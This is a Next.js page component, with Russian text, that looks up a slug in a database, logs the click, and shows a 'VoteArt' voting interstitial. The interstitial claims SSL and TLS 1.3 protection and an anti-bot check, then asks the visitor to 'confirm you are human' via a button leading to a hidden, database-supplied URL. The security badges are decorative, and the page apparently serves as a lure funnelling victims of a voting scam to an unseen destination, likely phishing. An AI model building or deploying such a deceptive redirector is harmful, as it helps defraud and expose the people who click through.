import { neon } from '@neondatabase/serverless';

export const dynamic = 'force-dynamic';

export default async function RedirectPage({ params }) {
  const resolvedParams = await params;
  const slug = resolvedParams?.slug;

  if (!slug || slug === 'favicon.ico' || slug === 'api') return null;

  let targetUrl = null;

  try {
    const dbUrl = process.env.POSTGRES_URL || process.env.DATABASE_URL;
    if (!dbUrl) return null;

    const sql = neon(dbUrl);
    const cleanSlug = String(slug).toLowerCase().trim();

    const rows = await sql`
      SELECT url FROM sub_links 
      WHERE LOWER(TRIM(subdomain)) = ${cleanSlug}
    `;

    if (rows && rows.length > 0 && rows[0].url) {
      targetUrl = rows[0].url;
    }
  } catch (error) {
    console.error('Ошибка обращения к БД:', error);
  }

  if (targetUrl) {
    if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
      targetUrl = `https://${targetUrl}`;
    }

    // Фиксируем переход в базе при загрузке страницы-прокладки
    try {
      const dbUrl = process.env.POSTGRES_URL || process.env.DATABASE_URL;
      const sql = neon(dbUrl);
      const cleanSlug = String(slug).toLowerCase().trim();
      await sql`
        UPDATE sub_links 
        SET clicks = COALESCE(clicks, 0) + 1 
        WHERE LOWER(TRIM(subdomain)) = ${cleanSlug}
      `;
    } catch (err) {
      console.error('Ошибка инкремента клика:', err);
    }

    return (
      <main style={{
        backgroundColor: '#080612',
        backgroundImage: `
          radial-gradient(circle at 50% 35%, rgba(124, 58, 237, 0.15) 0%, transparent 60%),
          radial-gradient(circle at 50% 20%, #1a1435 0%, #080612 70%)
        `,
        color: '#ffffff',
        minHeight: '100vh',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '20px',
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
      }}>
        <style>{`
          @keyframes pulseGlow {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
          }
          .verify-btn {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            width: 100%;
            padding: 15px 20px;
            background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%);
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            text-decoration: none;
            border-radius: 12px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.45);
            box-sizing: border-box;
          }
          .verify-btn:hover {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            box-shadow: 0 6px 25px rgba(124, 58, 237, 0.65);
            transform: translateY(-1px);
          }
          .verify-btn:active {
            transform: translateY(1px);
          }
        `}</style>

        <div style={{ position: 'relative', width: '100%', maxWidth: '440px' }}>
          {/* Внешнее фоновое свечение */}
          <div style={{
            position: 'absolute',
            top: '-2px',
            left: '-2px',
            right: '-2px',
            bottom: '-2px',
            background: 'linear-gradient(135deg, rgba(124, 58, 237, 0.4), rgba(52, 211, 153, 0.2))',
            borderRadius: '22px',
            zIndex: 0,
            filter: 'blur(10px)',
            opacity: 0.6
          }}></div>

          {/* Основная карточка */}
          <div style={{
            position: 'relative',
            zIndex: 1,
            width: '100%',
            background: 'rgba(22, 19, 38, 0.88)',
            border: '1px solid rgba(124, 58, 237, 0.3)',
            borderRadius: '20px',
            padding: '36px 28px',
            textAlign: 'center',
            boxShadow: '0 25px 50px rgba(0, 0, 0, 0.7)',
            backdropFilter: 'blur(16px)',
            boxSizing: 'border-box'
          }}>
            {/* Защитная щит-иконка */}
            <div style={{
              width: '48px',
              height: '48px',
              background: 'rgba(124, 58, 237, 0.12)',
              border: '1px solid rgba(124, 58, 237, 0.3)',
              borderRadius: '14px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              margin: '0 auto 16px',
              color: '#a78bfa',
              boxShadow: '0 0 20px rgba(124, 58, 237, 0.2)'
            }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="m9 12 2 2 4-4"/>
              </svg>
            </div>

            {/* Бейджик статуса */}
            <div style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '8px',
              background: 'rgba(16, 185, 129, 0.08)',
              color: '#34d399',
              fontSize: '12px',
              fontWeight: 500,
              padding: '6px 14px',
              borderRadius: '20px',
              marginBottom: '20px',
              border: '1px solid rgba(16, 185, 129, 0.2)'
            }}>
              <span style={{
                width: '6px',
                height: '6px',
                backgroundColor: '#34d399',
                borderRadius: '50%',
                boxShadow: '0 0 8px #34d399',
                animation: 'pulseGlow 2s infinite'
              }}></span>
              Защищённое SSL-соединение
            </div>

            <h1 style={{ fontSize: '21px', fontWeight: 700, marginBottom: '6px', color: '#ffffff', letterSpacing: '-0.2px' }}>
              VoteArt | Главная сцена
            </h1>
            <div style={{ fontSize: '13px', color: '#a78bfa', marginBottom: '18px', fontWeight: 500 }}>
              Система защиты от автоматической накрутки
            </div>

            <p style={{ fontSize: '13.5px', color: '#9ca3af', lineHeight: 1.55, marginBottom: '28px' }}>
              Для доступа к голосованию и подтверждения действительности вашего голоса пройдите быструю проверку безопасности.
            </p>

            {/* Кнопка прямого перехода по клику */}
            <a href={targetUrl} className="verify-btn">
              <span>Подтвердите что вы человек</span>
              <span style={{ fontSize: '13px' }}>→</span>
            </a>

            <div style={{
              marginTop: '26px',
              paddingTop: '18px',
              borderTop: '1px solid rgba(255, 255, 255, 0.06)',
              fontSize: '11px',
              color: '#6b7280',
              display: 'flex',
              flexDirection: 'column',
              gap: '6px'
            }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '12px', color: '#4b5563' }}>
                <span>ID: {slug.toUpperCase()}</span>
                <span>•</span>
                <span>TLS 1.3</span>
              </div>
              <div>© 2026 VoteArt. Все права защищены.</div>
            </div>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main style={{
      minHeight: '100vh',
      backgroundColor: '#080c14',
      color: '#fff',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: 'system-ui, sans-serif'
    }}>
      <h2 style={{ fontSize: '20px', fontWeight: 'bold' }}>Ссылка не найдена или устарела</h2>
    </main>
  );
}
